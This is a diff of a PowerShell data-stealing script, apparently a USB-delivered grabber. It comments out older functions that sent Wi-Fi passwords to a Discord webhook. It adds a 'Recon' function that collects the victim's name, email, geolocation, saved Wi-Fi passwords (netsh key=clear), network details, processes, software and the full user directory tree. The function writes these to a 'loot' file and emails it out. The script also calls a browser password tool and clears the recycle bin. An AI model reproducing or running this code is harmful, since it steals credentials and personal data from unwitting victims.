@@ -183,117 +183,117 @@ function RunWBPV {
         Write-Host "Operation $step / $totalSteps is done."
         SetEmailSentFalse
 }
-function GetWifiPasswords {
-    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
+# function GetWifiPasswords {
+#     $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
 
-    $results = @()
+#     $results = @()
 
-    foreach ($profile in $wifiProfiles) {
-        $profileDetails = netsh wlan show profile name="$profile" key=clear
-        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
-        $results += [PSCustomObject]@{
-            ProfileName = $profile
-            KeyContent  = $keyContent
-        }
-    }
+#     foreach ($profile in $wifiProfiles) {
+#         $profileDetails = netsh wlan show profile name="$profile" key=clear
+#         $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
+#         $results += [PSCustomObject]@{
+#             ProfileName = $profile
+#             KeyContent  = $keyContent
+#         }
+#     }
 
-    $results | Format-Table -AutoSize
+#     $results | Format-Table -AutoSize
 
-    # Save results to a file
-    $results | Out-File -FilePath "$env:TEMP\Wifi.txt"
+#     # Save results to a file
+#     $results | Out-File -FilePath "$env:TEMP\Wifi.txt"
 
-    # Email file
-    if (-not $isEmailsent) {
-        $subject = "$env:USERNAME: Netsh Profiles - Sent on $currentDateTime"
-        $attachments = @("$env:TEMP\Wifi.txt")  # Array of attachment file paths
-        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    }
+#     # Email file
+#     if (-not $isEmailsent) {
+#         $subject = "$env:USERNAME: Netsh Profiles - Sent on $currentDateTime"
+#         $attachments = @("$env:TEMP\Wifi.txt")  # Array of attachment file paths
+#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+#     }
 
-    if (-not $isEmailsent) {
-        foreach ($profile in $profiles) {
-            $wlan = $profile.Matches.Value
+#     if (-not $isEmailsent) {
+#         foreach ($profile in $profiles) {
+#             $wlan = $profile.Matches.Value
             
-            # Extract the Wi-Fi password
-            try {
-                $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-            } catch {
-                Write-Host "Failed to retrieve password for $wlan"
-                $passw = "N/A" # Assign a placeholder if password retrieval fails
-            }
+#             # Extract the Wi-Fi password
+#             try {
+#                 $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+#             } catch {
+#                 Write-Host "Failed to retrieve password for $wlan"
+#                 $passw = "N/A" # Assign a placeholder if password retrieval fails
+#             }
     
-            # Build the message body for the webhook
-            $Body = @{
-                'username' = $env:username + " | " + [string]$wlan
-                'content'  = [string]$passw
-            }
+#             # Build the message body for the webhook
+#             $Body = @{
+#                 'username' = $env:username + " | " + [string]$wlan
+#                 'content'  = [string]$passw
+#             }
     
-            # Send the data to the Discord webhook
-            try {
-                Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
-                Write-Host "Sending to Captain hook"
-            } catch {
-                Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
-            }
+#             # Send the data to the Discord webhook
+#             try {
+#                 Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
+#                 Write-Host "Sending to Captain hook"
+#             } catch {
+#                 Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
+#             }
 
-            # Increment to the next profile
-            $currentProfile++
-            Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
-        }
+#             # Increment to the next profile
+#             $currentProfile++
+#             Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+#         }
 
-    }
+#     }
 
-    SetEmailSentFalse
-}
-function GatherSystemInfo {
-    $sysInfoDir = "$env:TEMP\SystemInfo"
-    if (-Not (Test-Path $sysInfoDir)) {
-        New-Item -ItemType Directory -Path $sysInfoDir
-    }
+#     SetEmailSentFalse
+# }
+# function GatherSystemInfo {
+#     $sysInfoDir = "$env:TEMP\SystemInfo"
+#     if (-Not (Test-Path $sysInfoDir)) {
+#         New-Item -ItemType Directory -Path $sysInfoDir
+#     }
 
-    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
-    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
-    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
-    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
+#     Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
+#     Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
+#     Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
+#     Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
 
-    if (-not $isEmailsent) {
-        $subject = "$env:USERNAME: System Info - Sent on $currentDateTime"
-        $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
-        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    }
+#     if (-not $isEmailsent) {
+#         $subject = "$env:USERNAME: System Info - Sent on $currentDateTime"
+#         $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
+#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+#     }
     
-    SetEmailSentFalse
-}
-function ShowTree {
-    param (
-        [string]$Path = "C:\Users",
-        [string]$OutputFile = "$env:TEMP\tree.txt"  # Change this path as needed
-    )
+#     SetEmailSentFalse
+# }
+# function ShowTree {
+#     param (
+#         [string]$Path = "C:\Users",
+#         [string]$OutputFile = "$env:TEMP\tree.txt"  # Change this path as needed
+#     )
 
-    # Collect tree structure
-    $treeOutput = Get-ChildItem -Path $Path -Recurse -File -ErrorAction SilentlyContinue |
-        Where-Object { -not ($_.Attributes -match "System") } |
-        ForEach-Object {
-            $relativePath = $_.FullName.Replace($Path, "").TrimStart("\")
-            $depth = ($relativePath -split "\\").Count
-            "{0}{1}" -f (" " * ($depth - 1) * 2), $relativePath
-        }
+#     # Collect tree structure
+#     $treeOutput = Get-ChildItem -Path $Path -Recurse -File -ErrorAction SilentlyContinue |
+#         Where-Object { -not ($_.Attributes -match "System") } |
+#         ForEach-Object {
+#             $relativePath = $_.FullName.Replace($Path, "").TrimStart("\")
+#             $depth = ($relativePath -split "\\").Count
+#             "{0}{1}" -f (" " * ($depth - 1) * 2), $relativePath
+#         }
 
-    # Save to file
-    $treeOutput | Out-File -FilePath $OutputFile -Encoding UTF8
+#     # Save to file
+#     $treeOutput | Out-File -FilePath $OutputFile -Encoding UTF8
 
-    # Optional: Display a message
-    Write-Output "Tree structure saved to $OutputFile"
+#     # Optional: Display a message
+#     Write-Output "Tree structure saved to $OutputFile"
 
-    # SEND to EMAIL or WEBHOOK
-    if (-not $isEmailSent) {
-        # Email parameters
-        $subject = "$env:USERNAME: Tree Show - Sent on $currentDateTime"
-        $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths
-        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    } 
+#     # SEND to EMAIL or WEBHOOK
+#     if (-not $isEmailSent) {
+#         # Email parameters
+#         $subject = "$env:USERNAME: Tree Show - Sent on $currentDateTime"
+#         $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths
+#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+#     } 
 
-    SetEmailSentFalse
-}
+#     SetEmailSentFalse
+# }
 function GetBookmarks {
     # See if file is a thing
     Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf
@@ -388,16 +388,329 @@ function ClearCache {
     # Deletes contents of recycle bin
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
+function Get-fullName {
+    try {$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")}
+    catch { Write-Error "No name was detected";return $env:UserName;-ErrorAction SilentlyContinue } # If no name is detected function will return $env:UserName # Write Error is just for troubleshooting 
+    return $fullName 
+}
+$FN = Get-fullName
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Get-email {
+    try {$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim();return $email}
+    catch {Write-Error "An email was not found";return "No Email Detected";-ErrorAction SilentlyContinue} # If no email is detected function will return backup message for sapi speak # Write Error is just for troubleshooting 
+}
+$EM = Get-email
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+$GL = Get-GeoLocation
+
+function Recon{
+    ############################################################################################################################################################
+
+    # Get nearby wifi networks
+
+    try {
+        $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
+    }
+    catch {
+        $NearbyWifi="No nearby wifi networks detected"
+    }
+
+    ############################################################################################################################################################
+
+    # Get info about pc
+
+    # Get IP / Network Info
+    try {
+        $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+    }
+    catch {
+        $computerPubIP="Error getting Public IP"
+    }
+
+    $computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+
+    ############################################################################################################################################################
+
+    $IsDHCPEnabled = $false
+    $Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
+    foreach ($Network in $Networks) {
+        If($network.DHCPEnabled) {
+            $IsDHCPEnabled = $true
+            }
+        $MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
+    }
+
+    ############################################################################################################################################################
+
+    #Get System Info
+    $computerSystem = Get-CimInstance CIM_ComputerSystem
+    $computerBIOS = Get-CimInstance CIM_BIOSElement
+
+    $computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
+    $computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
+    $computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
+
+    $computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
+    $computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
+
+    ############################################################################################################################################################
+
+    # Get HDDs
+    $driveType = @{
+    2="Removable disk "
+    3="Fixed local disk "
+    4="Network disk "
+    5="Compact disk "}
+    $Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
+
+    #Get - Com & Serial Devices
+    $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
+
+    # Check RDP
+    $RDP
+    if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
+        $RDP = "RDP is Enabled" 
+    } else {
+        $RDP = "RDP is NOT enabled" 
+    }
+
+    ############################################################################################################################################################
+
+    # Get Network Interfaces
+    $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+
+    # Get wifi SSIDs and Passwords	
+    $WLANProfileNames =@()
+    #Get all the WLAN profile names
+    $Output = netsh.exe wlan show profiles | Select-String -pattern " : "
+    #Trim the output to receive only the name
+    Foreach($WLANProfileName in $Output){
+        $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
+    }
+    $WLANProfileObjects =@()
+    #Bind the WLAN profile names and also the password to a custom object
+    Foreach($WLANProfileName in $WLANProfileNames){
+        #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
+        try{
+            $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+        }Catch{
+            $WLANProfilePassword = "The password is not stored in this profile"
+        }
+        #Build the object and add this to an array
+        $WLANProfileObject = New-Object PSCustomobject 
+        $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
+        $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
+        $WLANProfileObjects += $WLANProfileObject
+        Remove-Variable WLANProfileObject
+    }
+
+    ############################################################################################################################################################
+
+    # local-user
+    $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID
+
+    # process first
+    $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
+
+    # Get Listeners / ActiveTcpConnections
+    $listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
+    $listener = $listener | foreach-object {
+        $listenerItem = $_
+        $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
+        new-object PSObject -property @{
+        "LocalAddress" = $listenerItem.LocalAddress
+        "RemoteAddress" = $listenerItem.RemoteAddress
+        "State" = $listenerItem.State
+        "AppliedSetting" = $listenerItem.AppliedSetting
+        "OwningProcess" = $listenerItem.OwningProcess
+        "ProcessName" = $processItem.ProcessName
+        }
+    } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 
+
+    # process last
+    $process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine
+
+    # service
+    $service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName
+
+    # installed software (get uninstaller)
+    $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
+
+    # drivers
+    $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
+
+    # videocard
+    $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
+
+    ############################################################################################################################################################
+
+    # MAKE LOOT FOLDER 
+
+    $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
+
+    ############################################################################################################################################################
+
+    # OUTPUTS RESULTS TO LOOT FILE
+
+    Clear-Host
+    Write-Host 
+
+    echo "Name:" >> $env:TEMP\$FileName
+    echo "==================================================================" >> $env:TEMP\$FileName
+    echo $FN >> $env:TEMP\$FileName
+    echo "" >> $env:TEMP\$FileName
+    echo "Email:" >> $env:TEMP\$FileName
+    echo "==================================================================" >> $env:TEMP\$FileName
+    echo $EM >> $env:TEMP\$FileName
+    echo "" >> $env:TEMP\$FileName
+    echo "GeoLocation:" >> $env:TEMP\$FileName
+    echo "==================================================================" >> $env:TEMP\$FileName
+    echo $GL >> $env:TEMP\$FileName
+    echo "" >> $env:TEMP\$FileName
+    echo "Nearby Wifi:" >> $env:TEMP\$FileName
+    echo "==================================================================" >> $env:TEMP\$FileName
+    echo $NearbyWifi >> $env:TEMP\$FileName
+    echo "" >> $env:TEMP\$FileName
+    $computerSystem.Name >> $env:TEMP\$FileName
+    "==================================================================
+    Manufacturer: " + $computerSystem.Manufacturer >> $env:TEMP\$FileName
+    "Model: " + $computerSystem.Model >> $env:TEMP\$FileName
+    "Serial Number: " + $computerBIOS.SerialNumber >> $env:TEMP\$FileName
+    "" >> $env:TEMP\$FileName
+    "" >> $env:TEMP\$FileName
+    "" >> $env:TEMP\$FileName
+
+    "OS:
+    =================================================================="+ ($computerOs |out-string) >> $env:TEMP\$FileName
+
+    "CPU:
+    =================================================================="+ ($computerCpu| out-string) >> $env:TEMP\$FileName
+
+    "RAM:
+    ==================================================================
+    Capacity: " + $computerRamCapacity+ ($computerRam| out-string) >> $env:TEMP\$FileName
+
+    "Mainboard:
+    =================================================================="+ ($computerMainboard| out-string) >> $env:TEMP\$FileName
+
+    "Bios:
+    =================================================================="+ (Get-WmiObject win32_bios| out-string) >> $env:TEMP\$FileName
+
+
+    "Local-user:
+    =================================================================="+ ($luser| out-string) >> $env:TEMP\$FileName
+
+    "HDDs:
+    =================================================================="+ ($Hdds| out-string) >> $env:TEMP\$FileName
+
+    "COM & SERIAL DEVICES:
+    ==================================================================" + ($COMDevices | Out-String) >> $env:TEMP\$FileName
+
+    "Network: 
+    ==================================================================
+    Computers MAC address: " + $MAC >> $env:TEMP\$FileName
+    "Computers IP address: " + $computerIP.ipaddress[0] >> $env:TEMP\$FileName
+    "Public IP address: " + $computerPubIP >> $env:TEMP\$FileName
+    "RDP: " + $RDP >> $env:TEMP\$FileName
+    "" >> $env:TEMP\$FileName
+    ($Network| out-string) >> $env:TEMP\$FileName
+
+    "W-Lan profiles: 
+    =================================================================="+ ($WLANProfileObjects| Out-String) >> $env:TEMP\$FileName
+
+    "listeners / ActiveTcpConnections
+    =================================================================="+ ($listener| Out-String) >> $env:TEMP\$FileName
+
+    "Current running process: 
+    =================================================================="+ ($process| Out-String) >> $env:TEMP\$FileName
+
+    "Services: 
+    =================================================================="+ ($service| Out-String) >> $env:TEMP\$FileName
+
+    "Installed software:
+    =================================================================="+ ($software| Out-String) >> $env:TEMP\$FileName
+
+    "Installed drivers:
+    =================================================================="+ ($drivers| Out-String) >> $env:TEMP\$FileName
+
+    "Installed videocards:
+    ==================================================================" + ($videocard| Out-String) >> $env:TEMP\$FileName
+
+
+    ############################################################################################################################################################
+
+    # Recon all User Directories
+    #tree $Env:userprofile /a /f | Out-File -FilePath $env:TEMP\j-loot\tree.txt
+    tree $Env:userprofile /a /f >> $env:TEMP\$FileName
+
+    ############################################################################################################################################################
+
+    # Remove Variables
+
+    Remove-Variable -Name computerPubIP,
+    computerIP,IsDHCPEnabled,Network,Networks, 
+    computerMAC,computerSystem,computerBIOS,computerOs,
+    computerCpu, computerMainboard,computerRamCapacity,
+    computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
+    Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
+    process,listener,listenerItem,process,service,software,drivers,videocard,
+    vault -ErrorAction SilentlyContinue -Force
+
+    ############################################################################################################################################################
+
+
+    $TargetFilePath = "/$FileName"
+    $SourceFilePath = "$env:TEMP\$FileName"
+
+    # SEND to EMAIL or WEBHOOK
+    if (-not $isEmailSent) {
+        # Email parameters
+        $subject = "$env:USERNAME: Tree Show - Sent on $currentDateTime"
+        $attachments = @("$env:TEMP\$FileName")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    } 
+
+    SetEmailSentFalse
+
+    ############################################################################################################################################################
+}
 
 for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
     switch ($step) {
 
         1 { RunWBPV }
-        2 { GetWifiPasswords }
-        3 { GatherSystemInfo }
-        4 { ShowTree }
-        5 { GetBookmarks}
+        2 { Recon }
+        3 { GetBookmarks }
+        4 { }
+        5 { }
     }
 }
 
